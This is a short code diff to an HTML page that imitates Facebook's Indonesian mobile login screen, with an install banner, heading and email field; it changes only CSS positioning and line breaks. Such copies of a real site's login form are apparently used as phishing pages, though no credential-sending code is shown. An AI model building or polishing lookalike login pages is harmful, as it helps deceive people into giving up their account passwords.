@@ -7,7 +7,7 @@
 								.pas{
 				background-color:#fff4d5;
 				color:#3B5998;
-				position:fixed;
+				position:absolute;
 				left:0;
 				right:0;
 				margin-top:-2%;
@@ -178,7 +178,7 @@
 				<div class="pasang">
 								<p class="pas">📱 Pasang Facebook untuk Android buka lebih cepat.</p>
 				</div>
-				<br><br><br>
+				<br><br>
 				<h2 class="fb">Facebook</h2>
 				<input class="email" type="email" placeholder="Nomor ponsel atau email" required>
 				<br>
